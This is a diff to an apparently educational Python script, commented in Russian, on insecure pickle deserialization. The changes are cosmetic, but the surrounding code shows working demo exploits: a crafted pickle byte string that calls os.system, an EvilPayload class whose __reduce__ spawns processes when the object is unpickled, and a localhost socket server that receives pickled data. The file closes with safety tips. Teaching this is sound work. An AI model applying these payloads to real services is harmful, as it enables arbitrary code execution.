@@ -12,7 +12,7 @@ import subprocess
 import socket
 import sys
 
-# Однако при десериализации не проверяется содержимое внутренностей объекта.
+# Однако при десериализации не проверяется содержимое объекта на безопасность.
 # Строка ниже выполнит системную функцию echo:
 
 pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.")
@@ -21,6 +21,8 @@ pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.")
 # А что, если передать pickle-объект по сети? Хорошая идея!
 # Другой вариант - создать свой класс,
 # метод __reduce__ которого должен будет осуществлять десериализацию
+
+
 class EvilPayload:
     """
     Функция __reduce__ будет выполнена при распаковке объекта
@@ -33,9 +35,9 @@ class EvilPayload:
         os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")
 
         if platform.system() == 'Linux':
-            PYTHON_PATH = sys.executable
-            BASE_PATH = os.path.dirname(os.path.abspath(__file__))
-            file_full_path = f"{PYTHON_PATH} {BASE_PATH}/run_evil_msg_for_ubuntu.py"
+            python_path = sys.executable
+            base_path = os.path.dirname(os.path.abspath(__file__))
+            file_full_path = f"{python_path} {base_path}/run_evil_msg_for_ubuntu.py"
             return subprocess.Popen, (("gnome-terminal", "--", "bash", "-c", file_full_path),)
 
         return subprocess.Popen, (('notepad', 'evil_msg.txt'),)
@@ -46,7 +48,7 @@ class EvilPayload:
 def evil_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(("localhost", 9999)) 
+    sock.bind(("localhost", 9999))
     print('Зловещий сервер запущен...')
     sock.listen()
     conn, addr = sock.accept()
@@ -60,8 +62,9 @@ def evil_server():
 evil_server()
 
 
-# Некоторые рекомендации по безопасному использованию модуля pickle
-# 1. По возможности, шифруйте сетевой трафик (SSL/TLS).
-# 2. Если шифрование невозможно, пользуйтесь электронной подписью для подтверждения данных.
-# 3. Если pickle-данные сохраняются на диск, убедитесь, что только доверенные процессы могут менять эти данные. 
-# 4. По возможности, ибегайте модуля pickle. Воспользуйтесь, например, JSON.
+"""
+ Некоторые рекомендации по безопасному использованию модуля pickle
+ 1. По возможности, шифруйте сетевой трафик (SSL/TLS).
+ 2. Если шифрование невозможно, пользуйтесь электронной подписью для подтверждения данных.
+ 3. Если pickle-данные сохраняются на диск, убедитесь, что только доверенные процессы могут менять эти данные. 
+ 4. По возможности, избегайте модуля pickle. Воспользуйтесь, например, JSON."""
